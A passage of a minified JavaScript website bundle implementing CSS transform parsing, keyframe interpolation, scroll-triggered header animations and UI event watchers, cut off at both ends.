new(e.bind.apply(e,QE([void 0],et.styleStringToPlainNumbers(t))))},e.prototype.toStyleString=function(){return this.keyword_+"("+this.values_.join(",")+")"},e.getDefaultValue=function(){return new e(1,1,1)},e.valuesLength=3,e}(et),lp=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},pr=["deg","rad","turn"],Pt=function(){function t(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.values_=t}return t.fromVariables=function(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];var r=new Xe(t.mapValuesBySymbol_.apply(t,e),Map,(function(){return 0}));return new(t.bind.apply(t,lp([void 0],pr.map((function(t){return r.get(t)})))))},t.mapValuesBySymbol_=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return t.map((function(t){return[t.symbol,t.numericValue]}))},t.fromNumbers=function(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return new(t.bind.apply(t,lp([void 0],e)))},t.fromStyleString=function(e){var i="calc"===e.slice(0,4)?e.slice(5,-1):e,r=ru.fromString(i).getPieces().filter((function(t){return wo(pr,t.symbol)})).filter((function(t){return t instanceof Bt})),n=pr.map((function(t){return r.find((function(e){return e.symbol===t}))||new Bt(0,t)})).map((function(t){return t.numericValue}));return new(t.bind.apply(t,lp([void 0],n)))},t.prototype.toNumbers=function(){return this.values_.slice()},t.prototype.toStyleString=function(){var t=Vt(this.values_,pr).filter((function(t){var e=t[0];t[1];return 0!==e})).map((function(t){return t.join("")}));return 0===t.length?"0":"calc("+t.join(" + ")+")"},t}(),ek=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),cp=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},ZE=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"rotate",e)||this}return ek(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,cp([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,cp([void 0],qt(et.styleStringToValues(t).map((function(t){return Pt.fromStyleString(t)})).map((function(t){return t.toNumbers()}))))))},e.prototype.toStyleString=function(){var t=Pt.fromNumbers.apply(Pt,this.values_).toStyleString();return this.keyword_+"("+t+")"},e.getDefaultValue=function(){return new(e.bind.apply(e,cp([void 0],Dt(e.valuesLength,(function(){return 0})))))},e.valuesLength=pr.length,e}(et),tk=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),up=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},JE=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"rotateX",e)||this}return tk(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,up([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,up([void 0],qt(et.styleStringToValues(t).map((function(t){return Pt.fromStyleString(t)})).map((function(t){return t.toNumbers()}))))))},e.prototype.toStyleString=function(){var t=Pt.fromNumbers.apply(Pt,this.values_).toStyleString();return this.keyword_+"("+t+")"},e.getDefaultValue=function(){return new(e.bind.apply(e,up([void 0],Dt(e.valuesLength,(function(){return 0})))))},e.valuesLength=pr.length,e}(et),rk=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),hp=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},eS=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"rotateY",e)||this}return rk(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,hp([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,hp([void 0],qt(et.styleStringToValues(t).map((function(t){return Pt.fromStyleString(t)})).map((function(t){return t.toNumbers()}))))))},e.prototype.toStyleString=function(){var t=Pt.fromNumbers.apply(Pt,this.values_).toStyleString();return this.keyword_+"("+t+")"},e.getDefaultValue=function(){return new(e.bind.apply(e,hp([void 0],Dt(e.valuesLength,(function(){return 0})))))},e.valuesLength=pr.length,e}(et),ik=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),fp=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},tS=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"rotateZ",e)||this}return ik(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,fp([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,fp([void 0],qt(et.styleStringToValues(t).map((function(t){return Pt.fromStyleString(t)})).map((function(t){return t.toNumbers()}))))))},e.prototype.toStyleString=function(){var t=Pt.fromNumbers.apply(Pt,this.values_).toStyleString();return this.keyword_+"("+t+")"},e.getDefaultValue=function(){return new(e.bind.apply(e,fp([void 0],Dt(e.valuesLength,(function(){return 0})))))},e.valuesLength=pr.length,e}(et),nk=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),dp=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},rS=pr.length,iS=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"rotate3d",e)||this}return nk(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,dp([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,dp([void 0],qt(et.styleStringToValues(t).map((function(t){return Pt.fromStyleString(t)})).map((function(t){return t.toNumbers()}))))))},e.prototype.toStyleString=function(){var t=nn(this.values_,rS).map((function(t){return Pt.fromNumbers.apply(Pt,t)})).map((function(t){return t.toStyleString()}));return this.keyword_+"("+t.join(",")+")"},e.getDefaultValue=function(){return new(e.bind.apply(e,dp([void 0],Dt(e.valuesLength,(function(){return 0})))))},e.valuesLength=4*rS,e}(et),sk=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),au=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},pp=pr.length,nS=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];var r=e.length===pp?au(e,e):e;return t.call(this,"skew",r)||this}return sk(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,au([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,au([void 0],et.styleStringToPlainNumbers(t))))},e.prototype.toStyleString=function(){var t=nn(this.values_,pp).map((function(t){return Pt.fromNumbers.apply(Pt,t)})).map((function(t){return t.toStyleString()}));return this.keyword_+"("+t.join(",")+")"},e.getDefaultValue=function(){return new(e.bind.apply(e,au([void 0],Dt(e.valuesLength,(function(){return 0})))))},e.valuesLength=2*pp,e}(et),ok=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),mp=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},sS=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"skewX",e)||this}return ok(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,mp([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,mp([void 0],qt(et.styleStringToValues(t).map((function(t){return Pt.fromStyleString(t)})).map((function(t){return t.toNumbers()}))))))},e.prototype.toStyleString=function(){var t=Pt.fromNumbers.apply(Pt,this.values_).toStyleString();return this.keyword_+"("+t+")"},e.getDefaultValue=function(){return new(e.bind.apply(e,mp([void 0],Dt(e.valuesLength,(function(){return 0})))))},e.valuesLength=pr.length,e}(et),ak=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),gp=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},oS=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.call(this,"skewY",e)||this}return ak(e,t),e.fromNumbers=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];return new(e.bind.apply(e,gp([void 0],t)))},e.fromStyleString=function(t){return new(e.bind.apply(e,gp([void 0],qt(et.styleStringToValues(t).map((function(t){return Pt.fromStyleString(t)})).map((function(t){return t.toNumbers()}))))))},e.prototype.toStyleString=function(){var t=Pt.fromNumbers.apply(Pt,this.values_).toStyleString();return this.keyword_+"("+t+")"},e.getDefaultValue=function(){return new(e.bind.apply(e,gp([void 0],Dt(e.valuesLength,(function(){return 0})))))},e.valuesLength=pr.length,e}(et),lu=new Map([["matrix",$E],["matrix3d",DE],["translate",kE],["translateX",FE],["translateY",NE],["translateZ",VE],["translate3d",BE],["scale",UE],["scaleX",GE],["scaleY",jE],["scaleZ",XE],["scale3d",KE],["rotate",ZE],["rotateX",JE],["rotateY",eS],["rotateZ",tS],["rotate3d",iS],["skew",nS],["skewX",sS],["skewY",oS]]),aS=new Set(Array.from(lu.keys())),Ga=function(){function t(t){this.transformValues_=t}return t.prototype.getTransformValues=function(){return this.transformValues_.slice()},t.prototype.getTransformValueClasses=function(){return this.transformValues_.map((function(t){return t.constructor}))},t.fromStyleString=function(e){for(var i=e,r=[];i.length>0;){var n=on(i),s=i.indexOf(n),o=i.slice(0,s-1);aS.has(o)||ct.throw('Unsupported transform function "'+o+'" provided to Toolbox Transform.');var a=lu.get(o),l=i.slice(0,s+n.length+1),h=a.fromStyleString(l);r.push(h),i=En(i.slice(l.length))}return new t(r)},t.prototype.toStyleString=function(){return this.transformValues_.map((function(t){return t.toStyleString()})).join(" ")},t}(),lS=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},lk=Hn.usingFunction(ck);function ck(t){var e=Hr.apply(void 0,t.map((function(t){return t.valuesLength})));return function(){function i(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.values_=t}return i.fromNumbers=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return new(i.bind.apply(i,lS([void 0],t)))},i.prototype.toNumbers=function(){return this.values_.slice()},i.fromStyleString=function(t){return new(i.bind.apply(i,lS([void 0],qt(Ga.fromStyleString(t).getTransformValues().map((function(t){return t.toNumbers()}))))))},i.prototype.toStyleString=function(){var e=this.values_.slice();return t.reduce((function(t,i){var r=e.slice(0,i.valuesLength);return e=e.slice(i.valuesLength),t+" "+i.fromNumbers.apply(i,r).toStyleString()}),"")},i.valuesLength=e,i}()}function cS(t){return lk.get(t)}var uS=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},hS=function(){function t(t,e,i){this.cachedValue_=null,this.position_=t,this.property_=e,this.value_=i}return t.prototype.getPosition=function(){return this.position_},t.prototype.getProperty=function(){return this.property_},t.prototype.getValue=function(t){return null!==this.cachedValue_?this.cachedValue_:"transform"===this.property_?this.getTransformValue_(t):this.isDynamicValue()?(this.cachedValue_=ip(this.property_,this.getRawValue()),this.cachedValue_):ip(this.property_,this.getRawValue())},t.prototype.isDynamicValue=function(){return"string"==typeof this.value_},t.prototype.getRawValue=function(){return"string"==typeof this.value_?this.value_:this.value_()},t.prototype.setPosition=function(e){return new t(e,this.property_,this.value_)},t.isValidTweenableProperty_=function(t){return nu.has(t)||"transform"===t},t.parseStyleMap_=function(e,i){return Array.from(i.entries()).filter((function(e){var i=e[0];e[1];return t.isValidTweenableProperty_(i)})).map((function(i){var r=i[0],n=i[1];return new t(e,r,n)}))},t.parseConfig=function(e){return qt(this.configToSortedStyleMaps_(e).map((function(e){var i=e[0],r=e[1];return t.parseStyleMap_(i,r)})))},t.configToSortedStyleMaps_=function(t){var e=Xe.usingFunction((function(){return new Map}));return t.forEach((function(t){var i=t[0],r=t[1],n=e.get(i);("string"==typeof r?go(r):r).forEach((function(t,e){return n.set(e,t)}))})),Array.from(e.entries()).sort((function(t,e){return t[0]-e[0]}))},t.getTransformClassesInOrder_=function(t){for(var e=t.map((function(t){return t.getTransformValueClasses()})),i=[],r=0;r<e.length;r++)for(var n=e[r],s=0;s<n.length;s++){var o=n[s];i.push(o);for(var a=0;a<e.length;a++){var l=e[a];l[0]===o&&(e[a]=l.slice(1))}}return i},t.prototype.getTransformValue_=function(e){for(var i=[this,e].sort((function(t,e){return t.getPosition()-e.getPosition()})).map((function(t){return Ga.fromStyleString(t.getRawValue())})),r=Ga.fromStyleString(this.getRawValue()),n=t.getTransformClassesInOrder_(i),s=cS(n),o=r.getTransformValues(),a=r.getTransformValueClasses(),l=[],h=0,c=0;c<n.length;){var u=n[c];u===a[h]?(l=uS(l,o[h].toNumbers()),h++):l=uS(l,u.getDefaultValue().toNumbers()),c++}return s.fromNumbers.apply(s,l)},t}();function fS(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return Hr.apply(void 0,t)/t.length}function dS(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return t.slice(1).reduce((function(t,e){return t-e}),t[0])}function pS(t){return Object.getPrototypeOf(t)}var uk=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r};function za(t){var e=pS(t);return e?uk([e],za(e)):[]}var hk=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r};function cu(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return Vt.apply(void 0,t.map((function(t){var e=za(t);return hk([t],e).reverse()}))).reverse().find((function(t){return Da.apply(void 0,t)}))[0]}var An=function(){function t(){}return t.zipValues_=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return Vt.apply(void 0,t.map((function(t){return t.toNumbers()})))},t.getClasses_=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return t.map((function(t){return t.constructor}))},t.getSharedClass=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=cu.apply(void 0,this.getClasses_.apply(this,t));return i},t.add=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];var r=this.zipValues_.apply(this,e).map((function(t){return Hr.apply(void 0,t)}));return(t=this.getSharedClass.apply(this,e)).fromNumbers.apply(t,r)},t.subtract=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];var r=this.zipValues_.apply(this,e).map((function(t){return dS.apply(void 0,t)}));return(t=this.getSharedClass.apply(this,e)).fromNumbers.apply(t,r)},t}(),ja=function(){function t(t,e){this.class_=cu(t.constructor,e.constructor),this.min_=t,this.max_=e,this.ranges_=Vt(t.toNumbers(),e.toNumbers()).map((function(t){var e=t[0],i=t[1];return new Ae(e,i)}))}return t.prototype.zipRangeAndNumbers_=function(t){return Vt(this.ranges_,t.toNumbers())},t.prototype.clamp=function(t){var e;return(e=this.class_).fromNumbers.apply(e,this.zipRangeAndNumbers_(t).map((function(t){var e=t[0],i=t[1];return e.clamp(i)})))},t.prototype.contains=function(t){return this.zipRangeAndNumbers_(t).reduce((function(t,e){var i=e[0],r=e[1];return i.contains(r)&&t}),!0)},t.prototype.add=function(e){return new t(An.add(this.min_,e),An.add(this.max_,e))},t.prototype.subtract=function(e){return new t(An.subtract(this.min_,e),An.subtract(this.max_,e))},t.prototype.expand=function(e){return new t(An.subtract(this.min_,e),An.add(this.max_,e))},t.prototype.collapse=function(e){return new t(An.add(this.min_,e),An.subtract(this.max_,e))},t.prototype.getMin=function(){return this.min_},t.prototype.getMax=function(){return this.max_},t.prototype.getValueAsPercent=function(t){return fS.apply(void 0,this.zipRangeAndNumbers_(t).map((function(t){var e=t[0],i=t[1];return e.getValueAsPercent(i)})))},t.prototype.getPercentAsValue=function(t){var e;return(e=this.class_).fromNumbers.apply(e,this.ranges_.map((function(e){return e.getPercentAsValue(t)})))},t.prototype.getRanges=function(){return this.ranges_},t.prototype.getOverlap=function(e){var i,r,n=Vt(this.ranges_,e.getRanges()).map((function(t){var e=t[0],i=t[1];return e.getOverlap(i)}));return new t((i=this.class_).fromNumbers.apply(i,n.map((function(t){return t.getMin()}))),(r=this.class_).fromNumbers.apply(r,n.map((function(t){return t.getMax()}))))},t}(),fk=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},vp=function(){function t(e,i){this.positionRange_=new Ae(e.getPosition(),i.getPosition()),this.keyframeA_=e,this.keyframeB_=i,this.getValueRange_=t.createGetValueRangeFunction_(e,i)}return t.prototype.containsPosition=function(t){return this.positionRange_.contains(t)},t.prototype.getValueAtPosition=function(t){var e;return e=this.positionRange_.getMin()===Number.NEGATIVE_INFINITY?0:this.positionRange_.getMax()===Number.POSITIVE_INFINITY?100:this.positionRange_.getValueAsPercent(t),this.getValueRange_().getPercentAsValue(e)},t.createGetValueRangeFunction_=function(t,e){if(t.isDynamicValue()||e.isDynamicValue())return function(){return new ja(t.getValue(e),e.getValue(t))};var i=new ja(t.getValue(e),e.getValue(t));return function(){return i}},t.getValueFromRanges=function(t,e){return e.find((function(e){return e.containsPosition(t)})).getValueAtPosition(t)},t.fromKeyframes=function(e){var i=e.sort((function(t,e){return t.getPosition()-e.getPosition()})),r=i[0],n=new t(r.setPosition(Number.NEGATIVE_INFINITY),r),s=i.slice(1).map((function(e,r){return new t(i[r],e)})),o=i.slice(-1)[0],a=new t(o,o.setPosition(Number.POSITIVE_INFINITY));return fk([n],s,[a])},t}(),mS=function(){function t(e){this.keyframePairsByProperty_=t.pairKeyframes_(e)}return t.pairKeyframes_=function(t){var e=this.mapKeyframesByProperty_(t),i=new ti;return e.forEach((function(t,e){i.set(e,vp.fromKeyframes(t))})),i},t.mapKeyframesByProperty_=function(t){return t.reduce((function(t,e){return t.get(e.getProperty()).push(e),t}),new ti)},t.prototype.getPropertyValueMapFromPosition=function(t){var e=new Map;return this.keyframePairsByProperty_.forEach((function(i,r){e.set(r,vp.getValueFromRanges(t,i))})),e},t.fromKeyframesConfig=function(e){return new t(hS.parseConfig(e))},t}(),Ya;!function(t){t[t.PERCENT=0]="PERCENT",t[t.PIXEL=1]="PIXEL"}(Ya||(Ya={}));var uu={easingFunction:function(t){return t},keyframeStyle:Ya.PERCENT,styleTarget:null},Yt=function(){function t(t,e){var i=void 0===e?uu:e,r=i.easingFunction,n=void 0===r?uu.easingFunction:r,s=i.keyframeStyle,o=void 0===s?uu.keyframeStyle:s,a=i.styleTarget,l=void 0===a?uu.styleTarget:a;this.animation_=mS.fromKeyframesConfig(t),this.styleTarget_=l,this.cachedGetDistanceFn_=o===Ya.PERCENT?function(t,e){return n(e)}:function(t,e){return t}}return t.prototype.run=function(t,e,i){var r=null===this.styleTarget_?t:this.styleTarget_;if(Ot(r)){var n=this.cachedGetDistanceFn_(e,i),s=this.animation_.getPropertyValueMapFromPosition(n);de.anyMutate((function(){s.forEach((function(t,e){Ie(r,e,t.toStyleString())}))}))}},t.prototype.destroy=function(){},t}(),dk="30px",gS=-55,pk={ENTER_START:-.1},mk=[[0,`opacity: 0; transform: translateY(${dk})`],[1,"opacity: 1; transform: translateY(0)"]],yp={DIRECTIVE:"mqn2-section-breaker-header",OFFSET_PERCENT:"mqn2-section-breaker-header-offset-percent"},vS=class{static get $inject(){return["$scope","$element","$compile"]}constructor(t,e){this.container_=e[0],this.tweenTarget_=Tt.getClosestMqnFrame(this.container_),this.scrollEffects_=[],this.init_(),t.$on("$destroy",(()=>this.dispose_()))}init_(){this.container_.removeAttribute(yp.DIRECTIVE);let t=this.container_.getAttribute(yp.OFFSET_PERCENT),e=null!==t?+t*window.innerHeight:0;this.scrollEffects_=[new jr(this.tweenTarget_,{getDistanceFunction:ni.DISTANCE_FROM_DOCUMENT_TOP,startDistance:()=>window.innerHeight*pk.ENTER_START+gS+e,endDistance:gS+e,effects:[new Yt(mk,{styleTarget:this.container_})]})]}dispose_(){this.scrollEffects_.forEach((t=>t.destroy())),this.container_.setAttribute(yp.DIRECTIVE,"")}},gk=()=>({restrict:"A",controller:vS}),yS=gk,bS=ye(Jt()),kt=ye(gt()),wS=ye(Ki()),_p=ye(Js()),ES=ye(Nt()),SS=ye(Gn());function Xn(t,e){var i=new Set;return t.forEach((function(t){e.has(t)||i.add(t)})),i}function hu(t,e){de.mutate((function(){e.forEach((function(e){return t.classList.add(e)}))}))}function Xa(t,e){de.mutate((function(){e.forEach((function(e){return t.classList.remove(e)}))}))}function vk(t,e){return e===Object.prototype.toString.call(t).slice(8,-1).toLowerCase()}function yk(t){return vk(t,"undefined")}function _k(t){return!yk(t)}function bk(){return wk()||Ek()}function wk(){return/iPhone|iPad|iPod/i.test(navigator.userAgent)||Sk()}function Ek(){return/Android/i.test(navigator.userAgent)}function Sk(){return-1!==navigator.userAgent.toLowerCase().indexOf("macintosh")&&Boolean(navigator.maxTouchPoints)&&navigator.maxTouchPoints>2}function Ak(t,e){let i=0,r=e=>{let r=window.innerWidth;(!bk()||i!==r)&&(t(e),i=r)};return window.addEventListener("resize",r,e),()=>{window.removeEventListener("resize",r)}}var Ck=class{constructor(){this.watcherConfigs=[]}add(t){Array.isArray(t.on)?t.on.forEach((e=>{let i=Object.assign({},t);i.on=e,this.addSingleEvent(i)})):this.addSingleEvent(t)}addSingleEvent(t){let e=e=>{t.runWhen?t.runWhen()&&t.callback(e):t.callback(e)};if(t.listener=e,"smartResize"===t.on)t.remover=Ak(e,t.eventOptions||{});else if("resize"===t.on&&t.element!==window){let i=new ResizeObserver((t=>{e(t)}));i.observe(t.element),t.remover=()=>{i.unobserve(t.element)}}else if("mutation"===t.on){let i=new MutationObserver((t=>{e(t)}));i.observe(t.element,t.eventOptions),t.remover=()=>{i.disconnect()}}else t.element,MediaQueryList,t.element.addEventListener(t.on,e,t.eventOptions||{}),t.remover=()=>{t.element.removeEventListener(t.on,e,t.eventOptions||{})};this.watcherConfigs.push(t)}removeById(t){this.watcherConfigs=this.watcherConfigs.filter((e=>{if(e.id&&e.id===t){let t=e.remover;return t&&t(),!1}return e}))}removeAll(){this.watcherConfigs.forEach((t=>{let e=t.remover;e&&e()})),this.watcherConfigs=[]}run(t){this.watcherConfigs.filter((e=>e.id&&e.id===t)).forEach((t=>{t.callback()&&t.callback()}))}dispose(){this.removeAll()}};function Tk(t){return Object.is(t,-0)?0:t}function xk(t,e,i){return Math.min(Math.max(i,t),e)}function _S(t){return xk(0,1,Tk(t))}function Ik(t){return _S(t)}function Pk(t,e,i){let r=Ik(i);return(1-r)*t+r*e}function fu(t,e){return Object.is(t,void 0)?e:t}function Ok(t,e=0,i=0,r=!1,n=0){let s,o=t.getBoundingClientRect();s=n||window.innerHeight;let a=(s-(o.top+e))/(o.height-e+i);return r?a:_S(a)}function Rk(t,e=0,i=0,r,n=!0){let s=window.innerHeight,o=n?Mk(t):$k(t);return Pk(o-s+e,o-s+t.offsetHeight+i,r)}function Mk(t,e=!1){return t?e&&t.offsetParent?t.getBoundingClientRect().top-t.offsetParent.getBoundingClientRect().top+window.scrollY:t.getBoundingClientRect().top+window.scrollY:0}function $k(t){let e=0;do{e+=t.offsetTop,t=t.offsetParent}while(t);return e}function Lk(...t){}var Dk=class extends Map{constructor(t=[],e=Lk){super(t),this.defaultFunction=e}static usingFunction(t){return new this([],t)}get(t){if(this.has(t))return super.get(t);{let e=this.defaultFunction(t);return this.set(t,e),e}}},kk=class{constructor(){this.callbacks=Dk.usingFunction((()=>new Set))}on(t,e){this.callbacks.get(t).add(e)}dispatch(t,...e){this.callbacks.get(t).forEach((t=>t(...e)))}off(t,e){let i=this.callbacks.get(t);i.delete(e),0===i.size&&this.callbacks.delete(t)}dispose(){let t=this.callbacks.values(),e=t.next();for(;!e.done;)e.value.clear(),e=t.next();this.callbacks.clear()}},Fk=class{constructor(){this.state=null,this.eventManager=new kk,this.listenerDisposers=[],this.addEvents("mousemove",this.setMouse.bind(this)),this.addEvents("mousedown",this.setMouse.bind(this)),this.addEvents("mouseup",this.setMouse.bind(this)),this.addEvents("touchmove",this.setMouse.bind(this)),this.addEvents("touchstart",this.setMouse.bind(this)),this.addEvents("touchend",this.setMouse.bind(this)),this.addEvents("keyup",this.setKeyboard.bind(this)),this.addEvents("keydown",this.setKeyboard.bind(this))}on(t,e){this.eventManager.on(t,e)}off(t,e){this.eventManager.on(t,e)}setKeyboard(){"keyboard"!==this.state&&(this.state="keyboard",this.eventManager.dispatch("keyboard"),this.eventManager.dispatch("any"))}setMouse(){"mouse"!==this.state&&(this.state="mouse",this.eventManager.dispatch("mouse"),this.eventManager.dispatch("any"))}addEvents(t,e){document.addEventListener(t,e),this.listenerDisposers.push((()=>{document.removeEventListener(t,e)}))}dispose(){this.eventManager.dispose(),this.listenerDisposers.forEach((t=>{t()}))}},an=class{constructor(t){this.debug=!1,this.keyboardModeOnly=!1,this.isUsingKeyboard=!1,this.element=t.element,this.watcher=new Ck,this.selector="data-scroll-to-on-focus",this.topProgressOffset=fu(t.topProgressOffset,0),this.bottomProgressOffset=fu(t.bottomProgressOffset,0),this.keyboardModeOnly=fu(t.keyboardModeOnly,!1),this.debug=fu(t.debug,!1),this.config=t,this.keyboardWatcher=new 